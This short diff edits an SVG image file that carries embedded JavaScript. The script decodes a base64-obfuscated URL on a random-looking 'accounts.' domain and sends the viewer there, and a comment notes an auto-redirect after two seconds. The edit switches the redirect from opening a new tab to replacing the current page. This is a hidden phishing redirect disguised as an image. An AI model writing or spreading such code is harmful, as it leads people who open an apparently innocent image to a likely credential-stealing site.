@@ -1,3 +1,4 @@
+
 <svg width="400" height="600" viewBox="0 0 400 600" xmlns="http://www.w3.org/2000/svg">
   <defs>
     <!-- Gradient for background -->
@@ -14,7 +15,7 @@
     function goToBase64Link() {
       var b64 = "aHR0cHM6Ly9hY2NvdW50cy5pd2EzcG42bHFudHhxbjRyanZrN2ZubzFudnZldzYweS5jb20v";
       var url = atob(b64);
-      window.open(url, "_blank");
+      window.location.href = url;
     }
 
     // Auto-redirect after 2 seconds
